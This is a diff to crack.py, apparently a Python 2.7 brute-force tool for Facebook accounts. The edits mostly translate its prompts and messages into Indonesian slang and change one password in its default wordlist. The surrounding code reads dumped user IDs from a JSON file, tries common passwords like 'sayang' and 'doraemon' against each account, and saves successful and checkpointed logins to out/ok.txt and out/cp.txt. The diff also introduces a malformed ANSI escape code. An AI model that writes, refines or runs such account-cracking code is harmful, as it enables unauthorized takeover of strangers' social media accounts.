@@ -6,7 +6,7 @@
 # File           : crack.py                           #
 # Author         : DulLah                             #
 # Recoder        : SkyMatz                            #
-# Github         : https://github.com/skymatz        #
+# Github         : https://github.com/skymatz         #
 # Facebook       : https://www.facebook.com/dulahz    #
 # Telegram       : https://t.me/unikers               #
 # Python version : 2.7                                #
@@ -64,7 +64,7 @@ class Brute:
 						break
 				except: pass
 				sys.stdout.write(
-					'\r[\033[0;96m{}\033[0m] Cracking {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
+					'\r[\033[0;96m{}\033[0m] Ngecrack... {}/{} OK-> CP-> '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
 				); sys.stdout.flush()
 		else:
 			self.loop +=1
@@ -76,18 +76,18 @@ class Brute:
 						break
 				except: pass
 				sys.stdout.write(
-					'\r[\033[0;96m{}\033[0m] Cracking {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
+					'\r[\033[0;96m{}\033[0m] Ngecrack... {}/{} OK-> CP-> '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
 				); sys.stdout.flush()
 
 	def main(self):
 		while True:
-			file = raw_input('\nList id (ex: dump/xxx.json): ')
+			file = raw_input('\nDaftar id (ex: dump/xxx.json): ')
 			try:
 				list = open(file, 'r').read()
 				object = json.loads(list)
 				break
 			except IOError:
-				print("\n\033[0;91mOops, file '%s' not Found!\033[0m"% file)
+				print("\n\033[0;91mUpps, g ada coek\033[0m")
 		self.target = []
 		for user in object:
 			try:
@@ -117,16 +117,16 @@ class Brute:
 				else:
 					listpass = [
 						'sayang', 'doraemon',
-						'bangsat', 'kontol'
+						'bangsat', 'indonesia'
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
 		if len(self.target) == 0:
-			exit("\n\033[0;91m Oops, id not found in file '%s'\033[0m"% file)
-		ask = raw_input('Use password defaults OR manual? [D/m]: ')
+			exit("\n\033[0;91m Upps, g ada coek\033[0m")
+		ask = raw_input('pake k-sandi default/manual? [d/m]: ')
 		if ask.lower() == 'm':
 			while True:
-				print('\n\033[0;92mSet password use (,) for new password, EX: sayang,doraemon,bangsat\n\033[0m')
+				print('\n\033[0;92mSetel k-sandi (,) untuk k-sandi baru, Ex: sayang,doraemon,indonesia\n\033[0m')
 				self.setpw = raw_input('Set password: ').strip().split(',')
 				if self.setpw[0] != '':
 					break
@@ -138,11 +138,11 @@ class Brute:
 	def results(self):
 		if (len(self.ok) != 0):
 			print('\n\nOK: '+str(len(self.ok)))
-			for i in self.ok: print('\033[0;92m### ' +str(i)+'\033[0m')
-			print('Your OK results saved in: out/ok.txt')
+			for i in self.ok: print('\033[0;92m[✓] ' +str(i)+'\033[0m')
+			print('Hasil OK tersimpan di: out/ok.txt')
 		if (len(self.cp) != 0):
 			print('\n\nCP: '+str(len(self.cp)))
-			for i in self.cp: print('\033[0;93m### '+str(i)+'\033[0m')
-			print('Your CP results saved in: out/cp.txt')
+			for i in self.cp: print('\033[0;93[×] '+str(i)+'\033[0m')
+			print('Hasil CP tersimpan di: out/cp.txt')
 		if (len(self.cp) == 0 and len(self.ok) == 0):
-			print('\n\n\033[0;91mNo results found :(\033[0m')
+			print('\n\n\033[0;91mG dpt apa" coek ;)\033[0m')
